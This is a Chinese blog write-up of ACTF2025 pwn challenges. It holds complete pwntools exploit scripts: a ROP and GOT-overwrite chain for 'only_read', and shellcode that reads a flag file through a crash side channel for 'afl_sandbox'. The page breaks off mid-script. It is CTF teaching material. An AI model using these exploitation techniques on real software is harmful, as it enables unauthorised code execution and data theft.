<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>ACTF2025 WriteUps | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="ACTF2025 WriteUps | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/actf2025-writeups/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="actf2025-pwn-writeup" class="scroll-target"><a href="#actf2025-pwn-writeup"><code class="hash inline-code">#</code>ACTF2025 Pwn Writeup</a></h1>
<p>本次 ACTF 我基本上 24 h 打满了，队伍里一共出了三道 pwn，我参与做了两道，另外一道 qemu pwn 没出，这里写一下 WriteUp。</p>
<h2 id="only_read" class="scroll-target"><a href="#only_read"><code class="hash inline-code">#</code>only_read</a></h2>
<p>题目很简洁，只给了一个不限长度的 <code class="inline-code">read</code>，保护如下：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-text">Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3fe000)
RUNPATH:    b'.'
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
</code></pre></div>
<p>看到这个保护肯定是想打 ret2dlresolve 的，但是题目里没有 <code class="inline-code">pop rdi; ret</code> 这种 gadget，所以我这边的思路是打 magic gadget。</p>
<p>我选择了下面这两条 gadget：</p>
<ul>
<li>libc 里：<code class="inline-code">0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;</code></li>
<li>程序中：<code class="inline-code">0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</code></li>
</ul>
<p>其中第一条是因为倒数第三字节和 libc 中 read 的偏移是一样的，不需要更多的爆破，第二条则是经典的 <code class="inline-code">magic_gadget</code>，两条配合起来可以做一个任意地址写原语。</p>
<p>流程如下：</p>
<ol>
<li>先用 read 构造程序地址写，把 read@got 部分写成第一条 gadget；</li>
<li>再利用任意地址写原语把 read@got 写成 ogg；</li>
<li>执行 ogg</li>
</ol>
<p>这个过程中需要很多栈迁移和提前布置栈，比较常规，不再赘述。</p>
<p>爆破期望 1/16，原因是 libc gadget 的倒数第四位不确定，需要爆破。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> os</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./only_read_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># 0x0000000000110a46: pop rbx; pop rbp; pop r12; pop r13; pop r14; ret;</span><br><span style="color:#A0ADA0"># 0x000000000040111c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Submit the token generated by `</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    cmd </span><span style="color:#999999">=</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">`</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    token </span><span style="color:#999999">=</span><span style="color:#393A34"> subprocess</span><span style="color:#999999">.</span><span style="color:#393A34">check_output</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">,</span><span style="color:#B07D48"> shell</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#393A34">strip</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">token</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    addr_reread </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401142</span><br><span style="color:#393A34">    addr_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40101a</span><br><span style="color:#393A34">    got_read </span><span style="color:#999999">=</span><span style="color:#393A34"> elf</span><span style="color:#999999">.</span><span style="color:#393A34">got</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    addr_magic </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40111c</span><br><span style="color:#393A34">    addr_start </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401050</span><br><span style="color:#393A34">    addr_pop_rbp_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40111d</span><br><br><span style="color:#393A34">    buf </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 128</span><br><span style="color:#393A34">    buf </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">got_read </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#393A34"> addr_reread</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">buf</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0.5</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">1</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><br><span style="color:#393A34">        elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#999999">,</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">fffdeae5</span><span style="color:#999999">,</span><br><span style="color:#393A34">        got_read </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3d</span><span style="color:#999999">,</span><br><span style="color:#2F798A">        0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><br><span style="color:#393A34">        addr_magic</span><br><span style="color:#999999">    </span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B07D48"> length</span><span style="color:#999999">=</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">38</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr_pop_rbp_ret</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">404090</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">plt</span><span style="color:#1e754f">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">read</span><span style="color:#B5695977">'</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">=</span><span style="color:#393A34"> rop_chain</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">403ff8</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">88</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    rop_chain </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr_reread</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">rop_chain</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">    sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0.5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x46\x3a</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#1E754F">while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">127.0.0.1</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9999</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    pwn</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<p><code class="inline-code">ACTF{5ystem_c4nnot_be_1nvoc4ked_@fter_corrupt1n9_1inkm4p}</code></p>
<h2 id="afl_sandbox" class="scroll-target"><a href="#afl_sandbox"><code class="hash inline-code">#</code>afl_sandbox</a></h2>
<p>题目一开始有个 hash 爆破，ai 一把梭了，虽然 hardness 是一个白给的 orw shellcode，但是因为 afl 执行程序异常后没有回显，所以没办法直接拿 flag，这里是用了基于报错的侧信道来爆破。</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-py language-py"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> sys</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> hashlib</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">harness</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">context</span><span style="color:#2993a3">(</span><span style="color:#B07D48">arch</span><span style="color:#999999">=</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">arch</span><span style="color:#999999">,</span><span style="color:#B07D48"> bits</span><span style="color:#999999">=</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">bits</span><span style="color:#999999">,</span><span style="color:#B07D48"> endian</span><span style="color:#999999">=</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">endian</span><span style="color:#999999">,</span><span style="color:#B07D48"> os</span><span style="color:#999999">=</span><span style="color:#393A34">elf</span><span style="color:#999999">.</span><span style="color:#393A34">os</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">difficulty </span><span style="color:#999999">=</span><span style="color:#2F798A"> 12</span><br><span style="color:#393A34">zeros </span><span style="color:#999999">=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">0</span><span style="color:#B5695977">'</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> difficulty</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> creat_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    p </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">223.112.5.141</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A"> 52051</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    break_hash</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> p</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> is_valid</span><span style="color:#2993a3">(</span><span style="color:#393A34">digest</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    if</span><span style="color:#393A34"> sys</span><span style="color:#999999">.</span><span style="color:#393A34">version_info</span><span style="color:#999999">.</span><span style="color:#393A34">major </span><span style="color:#AB5959">==</span><span style="color:#2F798A"> 2</span><span style="color:#999999">:</span><br><span style="color:#393A34">        digest </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#998418">ord</span><span style="color:#1e754f">(</span><span style="color:#393A34">i</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#393A34"> digest</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">    bits </span><span style="color:#999999">=</span><span style="color:#B5695977"> ''</span><span style="color:#999999">.</span><span style="color:#393A34">join</span><span style="color:#2993a3">(</span><span style="color:#998418">bin</span><span style="color:#1e754f">(</span><span style="color:#393A34">i</span><span style="color:#1e754f">)</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#999999">:</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">zfill</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#1E754F"> for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#393A34"> digest</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> bits</span><span style="color:#2993a3">[</span><span style="color:#999999">:</span><span style="color:#393A34">difficulty</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> zeros</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> sol</span><span style="color:#2993a3">(</span><span style="color:#393A34">prefix</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    i </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#1E754F">    while</span><span style="color:#1E754F"> True</span><span style="color:#999999">:</span><br><span style="color:#393A34">        i </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">        s </span><span style="color:#999999">=</span><span style="color:#393A34"> prefix </span><span style="color:#AB5959">+</span><span style="color:#998418"> str</span><span style="color:#2993a3">(</span><span style="color:#393A34">i</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> is_valid</span><span style="color:#2993a3">(</span><span style="color:#393A34">hashlib</span><span style="color:#999999">.</span><span style="color:#393A34">sha256</span><span style="color:#1e754f">(</span><span style="color:#393A34">s</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#a65e2b">(</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">digest</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            return</span><span style="color:#393A34"> i</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> break_hash</span><span style="color:#2993a3">(</span><span style="color:#393A34">p</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">solve this: sha256(</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    prefix </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B5695977"> "</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#998418">str</span><span style="color:#1e754f">(</span><span style="color:#393A34">sol</span><span style="color:#a65e2b">(</span><span style="color:#393A34">prefix</span><span style="color:#999999">.</span><span style="color:#393A34">decode</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> send_hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">msg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    h </span><span style="color:#999999">=</span><span style="color:#393A34"> msg</span><span style="color:#999999">.</span><span style="color:#393A34">hex</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34"> h</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    p</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">></span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">ans </span><span style="color:#999999">=</span><span style="color:#B5695977"> ''</span><br><span style="color:#393A34">this </span><span style="color:#999999">=</span><span style="color:#B5695977"> ''</span><br><span style="color:#393A34">index </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><br><span style="color:#393A34">sc </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'''</span><br><span style="color:#B56959">    lea rsi, [rbp - 0x800]</span><br><span style="color:#B56959">    mov rdi, 0</span><br><span style="color:#B56959">    mov rdx, 1</span><br><span style="color:#B56959">    mov rax, 0</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B56959">'''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sc </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">open</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/home/ctf/flag</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">sc </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">    lea rsi, [rbp - 0x800]</span><br><span style="color:#B56959">    mov rdi, 4</span><br><span style="color:#B56959">    mov rdx, 0x100</span><br><span style="color:#B56959">    mov rax, 0</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><br><span style="color:#B07D48">cmp</span><span style="color:#999999"> =</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"""</span><br><span style="color:#B56959">    cmp rbx, rax</span><br><span style="color:#B56959">    je equal</span><br><span style="color:#B56959">    jb below</span><br><span style="color:#B56959">great:</span><br><span style="color:#B56959">    ud2</span><br><span style="color:#B56959">equal:</span><br><span style="color:#B56959">    mov rax, 0x3c</span><br><span style="color:#B56959">    syscall</span><br><span style="color:#B56959">below:</span><br><span style="color:#B56959">    mov rsp, 0</span><br><span style="color:#B56959">    ret</span><br><span style="color:#B5695977">"""</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">p </span><span style="color:#999999">=</span><span style="color:#393A34"> creat_io</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">while</span><span style="color:#393A34"> this </span><span style="color:#AB5959">!=</span><span style="color:#B5695977"> '</span><span style="color:#B56959">}</span><span style="color:#B5695977">'</span><span style="color:#999999">:</span><br><span style="color:#393A34">    target </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#1E754F">    for</span><span style="color:#393A34"> i </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">        pow</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 7</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> i</span><br><span style="color:#393A34">        target </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">&#x3C;</span><span style="color:#998418"> pow</span><br><br><span style="color:#393A34">        shellcode </span><span style="color:#999999">=</span><span style="color:#393A34"> sc</span><br><span style="color:#393A34">        shellcode </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">'''</span><br><span style="color:#B56959">            xor rbx, rbx</span><br><span style="color:#B56959">            mov rax, </span><span style="color:#1e754f">{</span><span style="color:#393A34">target</span><span style="color:#1e754f">}</span><br><span style="color:#B56959">            mov bl, byte ptr [rsi + </span><span style="color:#1e754f">{</span><span style="color:#393A34">index</span><span style="color:#1e754f">}</span><span style="color:#B56959">]</span><br><span style="color:#B56959">        '''</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        shellcode </span><span style="color:#999999">+=</span><span style="color:#B07D48"> cmp</span><br><br><span style="color:#393A34">        send_hex</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcode</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        res </span><span style="color:#999999">=</span><span style="color:#393A34"> p</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">awesome, see you next time :)))</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        p</span><span style="color:#999999">.</span><span style="color:#393A34">close</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">        if</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Fork server crashed with signal 4</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> in</span><span style="color:#393A34"> res</span><span 